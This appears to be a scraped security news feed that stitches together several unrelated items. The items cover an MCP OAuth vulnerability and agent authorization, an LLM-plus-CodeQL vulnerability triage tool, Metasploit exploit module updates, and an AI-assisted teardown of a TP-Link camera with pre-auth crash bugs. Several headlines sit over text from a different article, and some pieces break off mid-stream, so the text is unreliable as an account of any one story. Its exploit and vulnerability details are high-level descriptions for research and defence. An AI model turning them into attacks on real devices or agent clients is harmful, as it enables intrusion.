CVE has been patched (fix commit). But the architectural assumption that enabled it remains embedded in how we’re building agent authorization: agents must trust external services to tell them how to authenticate.This is OAuth’s fundamental model. It assumes:A trusted identity provider existsThe client can discover and verify that providerToken exchange happens over secure, authenticated channelsThe human user validates the authentication flowNone of these assumptions hold for autonomous agents operating at scale.When Agent A needs to delegate authority to Agent B to call a third-party API, who is the identity provider? When that delegation happens asynchronously—maybe hours later, maybe through a message queue—how does the OAuth flow complete? When an agent orchestrator spawns hundreds of sub-agents, each needing scoped access to different resources, how many OAuth flows is that?The answer the industry has settled on is: store the credentials, pass them around, hope nothing goes wrong.CVE-2025-6514 shows what “goes wrong” looks like.OAuth was designed for a world where:Humans authenticate to servicesServices are few and well-knownSessions are synchronous and short-livedThe user is present to validate trust decisionsAI agents invert every one of these assumptions:Agents authenticate on behalf of humans (or other agents)Services are numerous, dynamic, and potentially untrustedOperations are asynchronous and long-runningNo human is present to click “Allow”The MCP vulnerability occurred precisely at this inversion point. The protocol asked: “Server, tell me where to authenticate.” The server answered with an attack payload. The client, following OAuth’s discovery model, obeyed.The implication is uncomfortable: every OAuth integration in an agent system is a potential attack vector. Not because OAuth is broken, but because its trust assumptions don’t match agent reality.A Different Model: Capability-Based DelegationWhat if agents didn’t need to ask external services how to authenticate? What if authorization wasn’t about acquiring tokens from trusted third parties, but about presenting cryptographically-verifiable capabilities that carry their own proof of validity?This is the capability-based security model, and it’s designed exactly for distributed, asynchronous, multi-party systems—which is what AI agent architectures actually are.Credentials stay at the boundary. A gateway service holds the actual API keys, OAuth tokens, and secrets. Agents never see them.Agents hold capabilities, not credentials. When a user authorizes an agent to “read my calendar,” the agent receives a capability token that grants exactly that permission—cryptographically signed, time-bounded, and unforgeable.Delegation is structural, not implicit. When Agent A needs Agent B to perform a subtask, A issues an  capability—mathematically guaranteed to grant equal or lesser permissions than A holds. No OAuth flow. No trusting B to tell A where to authenticate.Verification doesn’t require dynamic discovery. A capability token is cryptographically signed against a trust plane the verifier already knows. There’s no “ask the server where to authenticate” step. No metadata endpoint to poison. The attack surface that enabled CVE-2025-6514 simply doesn’t exist.OAuth Discovery AssumptionWhat CVE-2025-6514 Exploited”Trust the server to tell me where to auth”Malicious servers poison the flowNo dynamic discovery—capability tokens carry their own proof”Bearer token proves authorization”Token acquisition itself was attackedProof of Continuity binds to execution context, not exchange”IdP endpoint is safe to open”Endpoint URL was the injection vectorGateway holds credentials, agents hold only capabilities”Discovery metadata is trustworthy”Metadata poisoning enabled RCENo metadata-based auth flow—cryptographic chains onlyThe CVE-2025-6514 attack becomes impossible—not because we added input validation, but because the attack surface doesn’t exist. There’s no OAuth flow to hijack.What This Means for Agent BuildersIf you’re building AI agents today, you’re probably using one of three patterns:1. Environment variables / hardcoded keysThe agent has the actual credentials. Fast to implement, impossible to scope, nightmare to rotate, and a single prompt injection away from exfiltration.2. Secret managers (Vault, AWS Secrets Manager)Better storage, same problem. The agent still retrieves and holds the credential. You’ve secured the vault but handed the key to an entity that processes untrusted input.The “proper” solution—and the pattern that enabled this RCE vulnerability. Works for human-interactive flows, breaks at async boundaries, and creates the trust inversion that CVE-2025-6514 exploited.None of these were designed for autonomous agents delegating to other autonomous agents across trust boundaries.Capability-based delegation is. It’s not a new idea—the theory dates to the 1970s, battle-tested in systems like seL4 and KeyKOS. What’s new is applying it to the specific problem of AI agent authorization.The MCP community is actively working on authorization improvements. The June 2025 spec update discusses OAuth resource servers and related auth guidance, and the November 2025 revision adds client registration improvements. Separately, RFC 9728 introduced protected resource metadata for OAuth ecosystems (RFC 9728). These are steps in the right direction.But they’re still building on OAuth’s discovery model. They’re still assuming agents can safely discover, connect to, and trust external authorization infrastructure—now with better metadata validation, but the same fundamental trust assumption.The next vulnerability won’t be the same as CVE-2025-6514. But it will exploit the same structural assumption: that identity-based authorization, designed for humans clicking through browser flows, can secure autonomous agents operating at machine speed across organizational boundaries.Capability-based delegation offers a different foundation. One where:Trust is cryptographic, not discoveredDelegation is attenuated, not all-or-nothingVerification is local, not dependent on external servicesThe attack surface shrinks instead of growsWe’re building this infrastructure at Amla Labs.

By layering an LLM on top of CodeQL, we significantly reduce the overwhelming noise of false positives that typically buries security teams. The result is a workflow where developers and security researchers can focus only on findings that have genuine potential to be exploited.This approach led us to create , a tool that allows only the “true and brave” issues to pass through its gates. Using Vulnhalla, in just two days of work and with a budget of under $80, we identified the following vulnerabilities:CVE-2025-38676 (Linux Kernel),CVE-2025-9136 (RetroArch),CVE-2025-9809 (Libretro),CVE-2025-9810 (Linenoise).… and we continue to find new leadsThis article is based solely on publicly available information, open-source data and responsible security research. All vulnerabilities described were disclosed to affected vendors prior to publication.Challenges of using LLMs for vulnerability huntingEver since AI entered our lives, we’ve been wondering whether it could be used to identify security vulnerabilities, as manual vulnerability research is time-consuming and requires a significant amount of in-depth knowledge.Turns out we weren’t the only ones thinking about that. Google DeepMind, for example, initiated a project called NapTime, which later evolved into Deep Sleep, designed to identify security issues. Not long ago, OpenAI introduced us to Aardvark, an AI agent intended to achieve the same goal. Clearly, there is a demand to automate the cumbersome job of vulnerability research.In the past, the primary challenge with using large language models (LLMs) for vulnerability detection was the limited context window for a large code base. However, today that’s changing; some models can now handle up to a million tokens.With today’s LLMs, huge context, it mostly comes down to two problems:The WHERE problem is that the LLM doesn’t know which part of the code deserves attention. In a large codebase, the number of possible focus points is massive, which means the model can easily get distracted and look in the wrong place.The WHAT problem is that even if the model examines the correct location, it still needs to guess what kind of bug it should be looking for, such as memory issues, race conditions, or API misuse. Without guidance, it may pick the wrong category entirely and increase the chances of missing the real bug.Let’s explore how Google and OpenAI approached the challenge.Google’s Deep Sleep attempted to address these issues by analyzing code changes, such as git diffs or commit patches, linked to known CVEs, and verifying whether the fix or nearby code contains similar problems.Figure 1: Google’s blog on how Deep Sleep worksIt’s a good approach and handles both the WHERE and WHAT problems reasonably well. However, without a constant supply of new vulnerabilities discovered by researchers, along with their corresponding patches, it risks running out of material to analyze.They claim that around 1.2% of commits introduce known security issues, and their goal is to identify and address these. This helps address the WHERE problem by narrowing focus to potentially dangerous commits, but it doesn’t fully tackle the WHAT problem, since the model still has to decide what kind of bug to look for in each case.Our approach: Combining static analysis with LLMsOur approach to solving the WHERE and WHAT problems involves combining static analysis tools with an LLM.However, before we attempt to understand our approach, let’s first understand what static analysis is.Static analysis is the process of parsing source code statically, without executing it, to identify security bugs. It does so by extracting variables, structures, and code relationships. Save them into a database and build code-flow and data-flow graphs. Those graphs can then be checked against predefined rules or queries. For example, a rule might flag any use of  where the source size isn’t properly bounded by the destination, something that could lead to memory corruption, unsafe flows, and other critical issues.One of the most popular tools in this space is CodeQL, which is owned by GitHub and is integrated into GitHub Actions, allowing developers to scan their code upon build during the CI/CD. It supports a wide range of languages, including C/C++, C#, Java, JavaScript, TypeScript, Python, Go, Ruby, Swift, and Kotlin. You can run it manually through the CLI or via a VS Code extension.CodeQL analysis is based on queries, divided into stable and experimental sets. The stable ones will have a lower percentage of false positives. 

import cpp

from BlockStmt blk
where blk.getNumStmt() = 0
select blk

Snippet 1: Simple CodeQL query that selects all empty blocks in the codeAt this point, you might challenge our approach:If static analysis tools are so powerful, why bother combining them with LLM?To answer that, we tried running CodeQL on a few repositories ourselves.  We selected specific queries that, in our opinion, will be critical in the event of real issues. The result?A massive flood of results.Figure 3: The number of CodeQL results on each repositoryThere are potentially numerous security vulnerabilities that, if reviewed manually, require an average of three minutes per issue, resulting in a single researcher needing more than two years to complete the task. And that’s assuming we work on it as our full-time job, every single day. Meanwhile, new code is written, new queries are added, and if we switch to a new static analysis tool, we have to review thousands of fresh alerts all over again.This makes static analysis tools less effective for tackling real bugs, as the work accumulates, and the likelihood of finding bugs is relatively low.But ignoring those alerts can leave real vulnerabilities in the codebase, waiting for a patient attacker to discover.The false-positive realityYou might wonder how many of those findings are real issues and how many are noise. Honestly, it’s hard to know without spending years reviewing everything. False vary significantly between queries, and there is little research in academia or by security researchers specifically on CodeQL.However, there is extensive research on static analysis tools in general. In one study, developers were asked to test different static analysis tools, and these were some of the quotes:“In one tool we use, about 80% of findings are false positives; only 20% lead to fixes, and even those are rarely serious.”“We wouldn’t mind wading through 100 false positives if  we thought there were actually going to be genuine issues there… we went back to manual reviews.”Static analysis is robust, but the signal-to-noise ratio can be brutal. And that’s precisely why static analysis alone can be challenging at scale, and why combining it with LLMs might even be necessary.Putting the thesis to the testOur thesis on using CodeQL with LLM is straightforward: we take the source code, generate a CodeQL database of it, run CodeQL queries on the database, and then pass every alert from the results to the LLM to determine whether each one is a genuine issue or a false positive.Figure 4: This is what combining CodeQL with LLM will look likeTo test our thesis, let’s start with a simple C code that performs a memcpy operation. 

#include 
#include 
#include 

#define DEST_SIZE 16

size_t read_input(char** sourceBuf) {
    char* buf = malloc(DEST_SIZE + 1);
    size_t bufSize = 0;
    int c;

    while (bufSize < DEST_SIZE) {
        c = getchar();
        if (c == EOF || c == '\n') {
            break;
        }
        buf[bufSize++] = (char)c;
    }

    buf[bufSize] = '\0';

    *sourceBuf = buf;
    return bufSize;
}

int main(void) {
    char destBuf[DEST_SIZE + 1];
    char* sourceBuf;
    size_t sourceLen;

    sourceLen = read_input(&sourceBuf);
    if (sourceLen <= 0) {
        return 1;
    }

    memcpy(destBuf, sourceBuf, sourceLen + 1);
    
    printf("%s\n", destBuf);
    
    free(sourceBuf);

    return 0;
}
Snippet 2: false positive exampleWhen we run CodeQL on this code, it yields this one security issue:However, upon examining the code, it becomes clear that this isn’t the case, and we don’t have a vulnerability here. Both source size and destination size be bigger than the  macro, so the source size can never exceed the destination size. We have a hereNow, if we examine the output from CodeQL, we see that it simply displays a message and a line number.If we simply copy-paste the result from CodeQL into an LLM and ask whether it’s a real issue, of course, it won’t work. A line number by itself gives the LLM zero context.But what if we provide the line of code where the issue exists?
Is that enough?What happens when the LLM gets too little contextUsing the ChatGPT Personalization feature, we added the following prompt as Custom Instructions. 

You are a security static-analysis assistant.

You are given:
- Metadata about a CodeQL alert.
- A snippet of C source code that may contain the reported problem.

Your job:
- Decide whether the alert is likely a real bug, given ONLY the code shown.
- Respond VERY BRIEFLY (at most 2 sentences).

Rules:
- If you can determine it IS a real bug, start with: "Bug:" and give a short reason.
- If you can determine it is NOT a real bug, start with: "Not a bug:" and give a short reason.
- If you CANNOT TELL from the snippet and you need more code, start with: "Unknown:" and state EXACTLY what additional code or context you would need.

Do not speculate beyond the shown code.
Do NOT call something a bug unless the code shown is clearly unsafe.
Always list concrete missing pieces when you answer "Unknown:".
Snippet 3: Custom instructions for ChatGPT to act as a security assistantThen we generated a prompt to be used in ChatGPT-5.1 to test if it works. You can see that the message is directly built from the VS Code CodeQL extension results: 
Static analysis finding:

Name: Copy function using source size
Message: To avoid overflow, this operation should be bounded by destination-buffer size, not source-buffer size.
Location: look at main.c:36 with 'memcpy'

Here is the relevant code with full context:

```c
memcpy(destBuf, sourceBuf, sourceLen + 1);
Snippet 4: Prompt to query the LLM if this is a real issue, given only one lineLet’s see how the LLM responded:Figure 6: ChatGPT response to only one line of codeNot surprisingly, the LLM said it needed more context.
So the interesting question is: how much more? And how much is enough?From the CodeQL results (Figure 5), we only know the line number where the issue occurs. How can we derive more context from that line number? Let’s send additional lines of code before and after, say four lines before and four lines below. 
Static analysis finding:

Name: Copy function using source size
Message: To avoid overflow, this operation should be bounded by destination-buffer size, not source-buffer size.

Here is the relevant code with full context:

if (sourceLen <= 0) {
    return 1;
}

memcpy(destBuf, sourceBuf, sourceLen + 1);
    
printf("%s\n", destBuf);
    
free(sourceBuf);
Snippet 5: Prompt to query the LLM if this is a real issue, given four lines before and afterFigure 7: ChatGPT response to a few lines of codeAs you can see, this is still not enough for the LLM to determine anything reliably.So now what? We have yet to answer these questions: How do we know when the LLM has enough context? Do we need the entire file? Multiple files? Or just the full function? All of these questions are valid, and they led us to consider a different angle.Letting the LLM ask for its own contextOur hypothesis was: Let’s use the LLM to determine what context it needsWe start by providing the issue found by CodeQL with the full function where the issue exists.We ask the LLM which other context it needs.If the LLM asks for more, we provide it on demandFigure 8: The flow with context on demandSounds great in theory, but before we even test that theory, can we even extract the function when we only have the output line number?It turns out that it’s not trivial, especially in CThe complex problem of extracting functions in C“You can’t parse C code with regex.”We either need a compiler or implement a complex parser.For example, consider this C code: 

#define BEGIN {
#define END   }

int log_and_add(int x, int y)
BEGIN
    printf("adding {x,y} = %d\n", x + y);  // brace chars inside string
	
#ifdef DEBUG
    /* Fake function in a comment:
       int fake(int z) { return z*z; }
    */
#endif

    int (*callback)(int);  // looks like a function, but it's a pointer
    return x + y;
END

Snippet 6: It would be hard to parse this code with regex or bracket count. This code is based on a Stack Overflow answer about parsing C functions with regexMacros that are in bracketsFunction call inside a commentPointers that resemble function callsParsing this correctly is… not fun.Why code indexers didn’t workBy now, we thought we might be able to utilize a code indexer like Elixir.Indexers work similarly to static analysis: they traverse the codebase and record all types, functions, variables, and other entities. They’re super valuable for giant projects like the Linux Kernel.This is how you can run Elixir in order to index the Matter library (connecthomeip): 
docker exec -it -e PYTHONUNBUFFERED=1 elixir-container /usr/local/elixir/utils/index-repository connectedhomeip https://github.com/project-chip/connectedhomeip
Snippet 7: Example command for running Elixir’s index-repository utility in Docker, targeting the Matter (connectedhomeip) repository. See Elixir GitHub repository for details.But we ran into two huge problems:It took over 10 hours to index the repository.
Imagine scaling that to large projects.Elixir requires a GitHub URL, but the correct way to clone this repository is with the —, which pulls in all third-party dependencies. Elixir doesn’t support this, so you end up missing the code you depend on.So, code indexers were out.Using CodeQL as a code navigatorThen we realized that if code indexers basically do the same job of static analysis, and we are already using static analysis (CodeQL),Why not use the CodeQL database itself to extract all the necessary context on demand?Run one CodeQL query to get the function whose start line is smaller than the issue line, and the end line is bigger than the issue lineIf the LLM requests additional context, run another query and extract the necessary context.Figure 9: The flow with context on demand using CodeQL queriesIn theory, it can work really well:
CodeQL databases are generated during compile time, meaning:They include all third-party codeThey’re already available via GitHub API (CI/CD).No need to clone the repoQuerying them gives you precise, compiler-level structure.The performance bottleneckWhen we executed these context queries, we discovered that CodeQL queries take about 2.5 minutes on average for each query, since dynamic queries require CodeQL to resolve all types, references, and scopes on the fly.Precompiled queries take around 40 seconds, but to provide the LLM with an on-demand context, we need the query to be dynamic, which translates to an average of minutes.To put this in perspective:
When you run CodeQL on FFmpeg alone, you will get 46,589 potential issues.46,589 × 2.5 minutes = 116472.5 minutes (almost 11 months)So, we needed a better solution.Solution: Pre-Extracting functions into a CSVThen we figured that instead of running every query each time the LLM requests it, we should take a cleaner approach:Write one CodeQL query that selects every function in the database (including the caller function) and dumps it into a CSV file.Yes, the CSV file can be massive, but time is our limitation, not space.Then the workflow becomes:Extract all function information to CSVRun CodeQL on the code and save all the issues.Get the line where each issue occursScan the CSV to find the function :Extract that function directly from the code using the information from the CSV.If the LLM requires the caller function, simply search for its ID in the same context and send the updated context to the LLM.Even better, we can save even more time because every CodeQL database includes a src.zip file containing all the source code used to build the database.There is no need to clone the repository; simply download the database once from the GitHub API.Figure 10: The flow of context on demand using CSV filesWe repeated this process for structs, globals, macros, and other types. 
import cpp

from GlobalOrNamespaceVariable g
select g.getName() as global_var_name,
       g.getLocation().getFile() as file,
       g.getLocation().getStartLine() as start_line,
       g.getLocation().getEndLine() as end_line
Snippet 9: Example of CodeQL query to select all Global VariablesFigure 11: The CSV file outputYou are probably asking yourself, What about the performance? on average to find any other function in the CSV.We now have an effective code navigator that can provide the LLM with the exact context it needs.Testing LLM with full contextNow that we have a reasonably sophisticated AI Agent that can provide the LLM with all the necessary context, everything should work well.We’ll give the LLM the same prompt as before, but this time with the entire context the LLM needs, and see how it responds. Our goal is simple: the LLM should say this is a false positive, because the source buffer can never be larger than the destination.

Snippet 10: Prompt to query the LLM if this is a real issue, given the entire contextFigure 12: ChatGPT response when given the entire contextAnd… the LLM got it wrong.The LLM says that the code has a  problem. Even though that’s technically true, any human looking at this code would immediately realize it’s not actually a security issue. So why didn’t the LLM reach the same conclusion?Hint: It’s always the prompt – aka “What (and how!) are you actually asking?” After looking carefully at the prompt, we noticed the problem:The prompt and CodeQL are too focused on confirming whether the pattern  exists.For that specific question, the correct answer is “yes.”But the real question should be:Is this pattern really exploitable? To answer that, we need to examine other parts of the code, understand the data flow, and verify whether the source can ever exceed the destination. The LLM wasn’t instructed to do that.We could modify the prompt and force the LLM to check whether the destination size is smaller than the source, but that would be a trap. Complex code can hide size changes and indirect assignments, and if we start adding specific instructions, we’ll eventually overfit the prompt and miss edge cases.At this point, we realized something important:An LLM can review the code, but it’s akin to having a junior security researcher. We want it to think like an experienced researcher.Figure 13: The way an experienced researcher sees the codeWhen an experienced researcher reviews the code, he would probably have this flow in mind:Identify the sources of variables and how they change over time.That prompted us to consider a better way to build the prompt for the LLM by translating the thought process of experienced researchers, who will look for flows and variable sources. And will test assumptions step by step.Guiding the LLM with high-level questionsInstead of providing the LLM just the issue, we can ask it “ before making a judgment to enhance the LLM’s reasoning process. For example:Where is the source buffer declared?Does this size ever change?Where is the destination buffer declared?Are these buffers assigned from another location?What conditions or operations affect them?

Before deciding if the issue is real, you *MUST* answer first on the questions regarding the source and destination variables.
 
1. Where are they declared, what are their sizes, and do those sizes ever change? 
2. If they take values from other variables, where are those variables declared and what sizes do they have? 
3. Are there any checks or constraints on the source, the destination, or the variables assigned to them? 
4. What other operations act on these variables?

Snippet 11: guided questions for memcpy using source sizeAs you can see, this prompt doesn’t contain any other information about the issue from asking the LLM to describe the flow.Let’s use this prompt while examining the same simple C code from before.Figure 14: ChatGPT response when given the entire context and with Guided questionsThe LLM correctly recognized it as a false positive.Because the LLM generates its output based on the previous text, this format encourages it to reason step-by-step. By answering focused questions about variables and flows, the model simulates the reasoning of a senior researcher, and the final decision is made with all the correct information fresh in context.And since the LLM now “talks through” the variables, sizes, assignments, and paths, it naturally avoids the earlier mistake, requiring no special-case instructions, just like a senior researcher.But it’s important to remember that different types of issues require different guided questions. For some vulnerabilities, the LLM needs to reason about control flow. For others, it must analyze variable types, and in some cases, it has to focus on special conditions or edge cases.The key is to consider how you would explain the issue to a junior security researcher, what you would advise them to look for, and how you would phrase it so they understand the core idea. Those same explanations should become the questions you ask the LLM.Once you craft strong, well-focused questions, they will reliably work for all issues of the same type.Running the method in the real worldA practical answer to the WHERE and WHAT problems in static analysisAn AI agent that extracts all necessary context directly from the CodeQL CSV outputA reliable method to guide the LLM toward evaluating actual vulnerability, rather than matching surface-level patternsWe ran the tool across 100 large open-sourced GitHub repositories, selected by star count in C language, and scanned for multiple different issue types.For each issue category, we designed specific guided questions to focus the LLM on the exact semantics and context required for an accurate judgment of exploitability.The table below presents the aggregated results across all CodeQL queries included in the experiment.Total findings generated by CodeQLRemaining findings after AI filteringFalse-positive reduction rateHow many of the “real” issues were actually exploitable or meaningfulA “real” issue does not automatically imply a CVE-worthy or practically exploitable vulnerability.Even when the code pattern is correct, the function may be:used only in tests or example snippets,part of a non-security-critical component, orhosted in a repository that explicitly warns it is not secure or not intended for production.Therefore, “real” means only “not a false positive,” not necessarily that the issue is exploitable in practice.False Positive Reduction (%)Real Issues (% of Remaining)Copy function using source sizeDangerous use of transformation after operationIncorrect return-value check for scanf-like functionMissing return-value check for a ‘scanf’-like functionnew[] array freed with deleteNot enough memory allocated for array of pointer typeOperator precedence logic errorPointer offset used before checkPointer to stack object used as return valueRedundant/missing null check of parameterScanf function without specified lengthLinux Kernel, bullet3, LibretroUnchecked return value used as offsetUsing this method, we built an open-source tool called . It allows you to download a CodeQL database directly from GitHub, run queries on it, and feed the results into an LLM. For each finding, the tool automatically retrieves the relevant code context and applies issue-specific guided questions. This enables the model to reason more accurately about the underlying logic, filter out false positives, and surface only the findings with real potential.Vulnhalla addresses the persistent signal-to-noise bottleneck in large-scale static analysis by combining CodeQL with LLM-powered reasoning for precise and scalable vulnerability discovery.The tool currently supports full code navigation for C and C++ and includes several example templates for guided questions. We invite the community to contribute by expanding support to additional programming languages. This involves writing CodeQL queries that extract the relevant data into CSV form based on language semantics, and creating new guided-question templates tailored to each issue type and language.Key Takeaways and Next Steps for CodeQL and LLM Vulnerability HuntingOur key findings and technical contributions for the research community are:Up to 96% false positive reduction: In our experiments, we observed up to 96% reduction in false positives for specific issue types, which significantly alleviates the manual review burden of static analysis at scale. This reduction will vary depending on the specific issues and Guided Questions.Performance optimization: Eliminated multi-minute context retrieval latency by pre-indexing CodeQL database entities (functions, structs) into a quickly queryable CSV format. This allows the LLM agent to fetch comprehensive context in approximately 3 seconds per query. We utilized a Guided Question prompting strategy to compel structured LLM reasoning. This technique employs a multi-step analysis: tracing data flow and control flow, which emulates the analysis of experienced researchers, shifting the focus from pattern-matching to assessing real The methodology was validated by directly leading to the discovery of multiple verified vulnerabilities (all of which were handled through responsible disclosure).This validated hybrid approach demonstrates a promising step for AI-based automated vulnerability discovery. By increasing the efficiency and accuracy of identifying high-impact flaws, we believe this work can help significantly close existing security gaps. We are releasing the tool as an open source to encourage further refinement and research.Simcha Kosman is a senior cyber researcher at CyberArk Labs.]]></content:encoded></item><item><title>Iranian Infy APT Resurfaces with New Malware Activity After Years of Silence</title><link>https://thehackernews.com/2025/12/iranian-infy-apt-resurfaces-with-new.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHegtv-omZYW79shLsEk_Vh8OqZ0lziJ2eEH1ADUh6S26O4zAQVpJ0RPi4Y8sOn1QCZNMVMwJoz8_9KxEGiDsef2EUlIPqPEakq3DA5gNpJGlqRHspRCVBRtZM-9ur6CtAPdwtj57Acs2U3HXg2IV6RWyK51gp-L6VZywbKe3GHWqSyeXzi8UZSkFkmtd6/s1600/desk.jpg" length="" type=""/><pubDate>Sun, 21 Dec 2025 04:22:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Threat hunters have discerned new activity associated with an Iranian threat actor known as Infy (aka Prince of Persia), nearly five years after the hacking group was observed targeting victims in Sweden, the Netherlands, and Turkey.

The first improvement affects all Metasploit modules. When an exploit is used, an initial payload is selected using some basic logic that effectively would make a selection from the first available in alphabetical order. Now Metasploit will prefer a default of x86 Meterpreters for Windows systems (since 32-bit payloads work on both 32-bit and 64-bit versions of Windows) and x64 Meterpreters for all other platforms including Linux. In the context of React2Shell, this means the payload now defaults to x64 for Linux instead of AARCH64.Another improvement that only affects this exploit was the change of the default payload to one leveraging Node.js which is more likely to be present than the wget binary that was required. These defaults should hopefully help users get started with this high-impact exploit with more ease, but of course any compatible payload can still be selected.Stay tuned for the Metasploit annual wrap-up and roadmap announcement coming up!N-able N-Central Authentication Bypass and XXE ScannerPath: Description: This adds an auxiliary module that exploits two CVEs affecting N-able N-Central. CVE-2025-9316, an Unauthenticated Session Bypass and CVE-2025-11700 a XXE (XML External Entity) vulnerability. The module combines both vulnerabilities to achieve unauthenticated file read on affected N-Central instances (versions < 2025.4.0.9).Grav CMS Twig SSTI Authenticated Sandbox Bypass RCEPath: Description: This adds an exploit module for a Server-Side Template Injection (SSTI) vulnerability (CVE-2025-66294) in Grav CMS, versions prior to 1.8.0-beta.27 , that allows bypassing the Twig sandbox to achieve remote code execution. To inject the malicious payload into a form's process section, this module leverages CVE-2025-66301, a broken access control flaw in the /admin/pages/{page_name} endpoint.Enhancements and features (2)#20424 from cdelafuente-r7 - Updates how vulnerabilities and services are reported by adding a resource field to both models.

Whenever someone asks me how to get started with reverse engineering, I always give the same advice: buy the cheapest IP camera you can find. These devices are self-contained little ecosystems - they have firmware you can extract, network protocols you can sniff, and mobile apps you can decompile. Chances are, you’ll find something interesting. At worst, you’ll learn a lot about assembly and embedded systems. At best, you’ll find some juicy vulnerability and maybe learn how to exploit it!I own several TP-Link Tapo C200 cameras myself. They’re cheap (less than 20 EUR from Italy), surprisingly stable, and I genuinely like them - they just work. One weekend, I decided just for fun to take my own advice. The Tapo C200 has been around for a while and has had a few CVEs discovered and more or less patched over the years, so I honestly wasn’t expecting to find much in the latest firmware. However, I wanted to use this chance to perform some AI assisted reverse engineering and test whether I could still find anything at all.I documented the entire process live on Arcadia - my thought process, the dead ends, the AI prompts that worked and the ones that didn’t. If you want the raw, unfiltered version with screenshots and videos of things crashing, go check that out.This post is the cleaned-up version of that journey, where I wanted to show how I approach firmware analysis these days, now that we have AI. You will notice that in several instances I will be particularly lazy and delegate to AI things I could have done manually and/or inferred myself after some more work. Keep in mind that while I  generally lazy, this was also an experiment in integrating and documenting how effective AI can be for security research and reverse engineering, and especially in making them accessible to less experienced/sophisticated researchers/attackers.
        Old friend JD-GUI to reverse the Android app and get a sense of things
    Grok to give a quick AI assisted look into prior research.   
    The first step is always obtaining the firmware binary file and this time it was super easy! After some basic reversing of the Tapo Android app, I found out that TP-Link have their entire firmware repository in an open S3 bucket. No authentication required. So, you can list and download every version of every firmware they’ve ever released for any device they ever produced:I grabbed version 1.4.2 Build 250313 Rel.40499n for the C200 (Hardware Revision 3), named Tapo_C200v3_en_1.4.2_Build_250313_Rel.40499n_up_boot-signed_1747894968535.bin, and started poking around. However, the first attempt at identifying its format via binwalk was not successful, indicating that some sort of encryption or obfuscation was in place.And here is where I started using AI. I used Grok to do some deep research on how to decrypt the firmware for these cameras. Since I knew other hackers worked on this before, I delegated searching into hundreds of relevant web pages to the AI:Thanks to Grok, the tp-link-decrypt tool and the fact that every firmware image for every device seems to be encrypted the same exact way, we can now decrypt the firmware. The tool extracts RSA keys from TP-Link’s own GPL code releases - they publish the decryption keys themselves as part of their open source obligations.After decryption, the firmware revealed a fairly standard structure: a bootloader, a kernel, and a SquashFS root filesystem.Ghidra to decompile and understand the MIPS binaries
    GhidraMCP to let an AI connect to my running Ghidra instance and support me in the process.
    
            Cline
         to ask AI to explore the filesystem and find interesting components.
    Once extracted, I used AI and Cline to explore the filesystem in search of which components handle the discovery protocol, camera web API, video streaming, etc all discovered earlier while reversing the Android app.Loading Ghidra and giving a quick look at the  binary, revealed the first interesting thing:This private key is not generated at boot. Similarly to CVE-2025-1099 for the C500, the C200 embeds in its firmware the private key that serves the SSL for a few APIs. If you’re on the same network as a camera, you can MitM and decrypt their HTTPS traffic with keys you extracted from the firmware image - without ever touching the hardware. For a  camera streaming video of people’s homes, this is… not ideal.I kept loading the other interesting binaries and exploring them in Ghidra using AI to quickly get a sense of the main features and possible entry points for an attacker.Asking AI to explain a function and its relation to the other functions proved to be very useful for instance to understand encryption / obfuscation routines and network protocol handlers. This allows you to go from here:To a higher level understanding that the AI can provide:Another technique I found particularly effective is asking the AI to analyze a given function of interest and rename its variables and parameters to something meaningful based on context. Then do the same for the functions it calls, recursively following the branches you’re interested in. After a few iterations, what started as FUN_0042eb7c(undefined2 *param_1, undefined4 param_2, int param_3) becomes handleConnectAp(connection *conn, int flags, json *params) - and suddenly the decompiled code reads almost like the original source. This iterative refinement approach, which I find a great example of human-AI collaboration where neither alone would be as efficient, is how I mapped most of the HTTP handlers, discovery protocol, and so on. What follows is the bottom line of my findings. For more details on the process, refer to the original Discord thread.As a side note, I did not investigate (much) the exploitability of the following bugs to achieve code execution, mostly because I’m not familiar with MIPS, and it was not my intent. You can however do it relatively easily once obtained a shell via physical access, due to the presence of the  binary in the firmware.Bug 1: Pre-Auth ONVIF SOAP XML Parser Memory Overflow (CVE-2025-8065)The Tapo C200 exposes an ONVIF service via the  server listening on port 2020 for interoperability with standard video management systems. The problem is in how it parses SOAP XML requests.When processing XML elements, the parser (soap_parse_and_validate_request at ) calls  without any bounds checking on the number of elements or total memory allocation. Send it enough XML elements, and you’ll overflow allocated memory.Send this, and the camera crashes, requiring a power cycle to recover.CVSS v4.0 Score: 7.1 / HighCVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:NBug 2: Pre-Auth HTTPS Content-Length Integer Overflow (CVE-2025-14299)The HTTPS server routine running on port 443 has a classic integer overflow in its  header parsing.

They explicitly market themselves as having fewer CVEs than Cisco, Netgear, and D-Link. They state they “aim to patch vulnerabilities within 90 days.”There’s an obvious and structural conflict of interest when a vendor is allowed to be their own CNA while simultaneously using their CVE count as a marketing metric.]]></content:encoded></item><item><title>Microsoft confirms Teams is down and messages are delayed</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-confirms-teams-is-down-and-messages-are-delayed/</link><author>Mayank Parmar</author><category>security</category><pubDate>Fri, 19 Dec 2025 20:04:28 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft Teams is experiencing issues, with thousands reporting problems sending messages, including delays.

Let me explain.Since the early 2000s, I've seen consulting and product companies deny hiring cybersecurity juniors. The "You need 5 years of experience to start working in security" mindset. On the other side, one of the main issues in security is the difficulty of having secure by default software and systems. The example I like to give is:If you give 5 minutes to someone that never used a computer, can they set up a 2FA for their email by themselves without any help? 99.9% of the time the answer is... No!To evolve as a secure society, with everything going on on the internet from breaches, attacks, DoS, fraud, state attacks, and more, we need everyone to be secure on the web. This helps secure the economy and secure our critical infrastructure.But this is hard to achieve. Many organizations, cities, and governments do not have enough experienced people to build secure infrastructure, or do not have the time or the budget to do so. We've sadly seen too many municipalities with one person doing everything IT and security. They do what they can, but they can't do everything perfectly.Doing everything perfectly is also complex. So many different systems to learn to use, deploy, implement, secure, operate, etc.The issue: Most systems aren't secure by default and don't offer secure features by default. We've seen those pay to play 2FA or banks not even offering 2FA or good 2FA. See that list for Canadian banks.So to go back to our juniors having difficulty finding a cybersecurity job... well we also need entrepreneurs!Creating security features that can be easily included in products, software, or hardware, that require no security or minimal to no IT knowledge to use them. Those features should be implicit, by default, and plug and play.We talked about 2FA that is hard for people with extensive IT knowledge. Now passkeys exist. They are much easier, solve the password issues, but still require the user to be OK with mobile 